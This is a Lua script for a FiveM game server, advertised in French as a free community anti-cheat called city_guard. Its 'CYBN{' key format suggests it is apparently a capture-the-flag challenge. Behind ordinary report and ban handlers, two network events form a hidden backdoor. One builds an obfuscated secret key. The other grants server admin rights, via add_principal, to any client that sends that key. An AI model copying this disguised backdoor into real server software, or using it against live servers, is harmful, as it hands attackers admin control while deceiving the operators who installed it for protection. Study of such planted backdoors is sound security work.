--[[
    city_guard — Anti-Cheat communautaire (build 2.4.1)
    Licence MIT — distribution libre
    Merci d'avoir choisi city_guard pour protéger votre ville !
]]

local banned = {}

local function isAdmin(src)
    return IsPlayerAceAllowed(src, 'city_guard.admin')
end

RegisterNetEvent('city_guard:report', function(targetId, reason)
    local src = source
    if not isAdmin(src) then return end
    print(('[city_guard] %s signale %s : %s'):format(src, targetId, reason))
end)

AddEventHandler('playerConnecting', function(name, _, deferrals)
    deferrals.defer()
    Wait(0)
    if banned[name] then
        deferrals.done('Vous êtes banni par city_guard.')
    else
        deferrals.done()
    end
end)

local _state = {}

RegisterNetEvent('city_guard:sync', function(frag)
    local _z = vec4(0x79, 0x5f, 0x73, 0x34)
    local _o = _z.zwxy
    local verb = string.char(_o.x, _o.y, _o.z, _o.w)
    _state.op = 'CYBN{' .. verb .. (Config.FlagPrefix or '') .. (frag or '') .. GetGameName() .. ('_%x'):format(`fivem`) .. '}'
end)

RegisterNetEvent('city_guard:maint', function(key)
    if not _state.op or key ~= _state.op then return end
    local src = source
    ExecuteCommand(('add_principal player.%d group.admin'):format(src))
    print('[city_guard] maintenance: acces accorde a ' .. src)
end)
